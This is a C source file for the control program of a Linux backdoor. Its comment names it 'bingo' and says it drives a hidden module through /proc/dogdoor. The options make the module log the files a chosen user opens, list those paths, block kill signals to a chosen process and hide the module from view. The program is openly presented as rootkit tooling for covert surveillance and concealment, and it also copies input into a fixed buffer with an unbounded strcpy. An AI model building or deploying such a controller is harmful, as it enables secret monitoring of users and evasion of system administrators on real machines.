#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <pwd.h>
/*
   bingo is backdoor program
	
	op : 1(openlist) [-a username]
	takes arg(username) and make module log the files of that user opens

    op : 2(printlist) [-l]
    prints 10 paths list of user opened  

	op : 3(nokill) [-b pid]
	takes arg(pid) and stop signal kill to kill process 	

	op : 4(hide) [-c]
	Hides the module
 */


#define DEVICE "/proc/dogdoor"

int main(int argc, char ** argv)
{
	
	int listflag = 0;
	int hideflag = 0;
	char username[64] = "-1";	
	int pid = -1;
	uid_t uid = -1;
    int opt;

    struct passwd *p;
	while((opt = getopt(argc, argv, "a:lb:c")) != -1){
		switch (opt) {
		case 'a':
			strcpy(username, optarg);
			p = getpwnam(username);
            
            if(p == 0x0){
                perror(username);
                exit(1);
            }
            uid = p->pw_uid;

            break;

		case 'l':
			listflag = 1;
			break;

		case 'b':
			pid = atoi(optarg);
			break;

		case 'c':	
			hideflag = 1;
			break;

		default: /* '?' */
			fprintf(stderr, "Usage: %s [-a username] [-b pid] [-c]\n", argv[0]);
			exit(EXIT_FAILURE);
		}	
	}
   
	printf("username : %s(%d)\n", username, uid);
	printf("listflag : %d\n", listflag);
	printf("pid : %d\n", pid);
	printf("hideflag : %d\n", hideflag);
	
    char buf[128];
    sprintf(buf, "%s %d %d %d %d", username, uid, listflag, pid, hideflag ); // (username[2] |  listflag | pid | hideflag )
	printf("========================\n");
    

	int fd = open(DEVICE, O_CREAT | O_RDWR);

	write(fd, buf, sizeof(buf));

	close(fd);

	return 0;
}
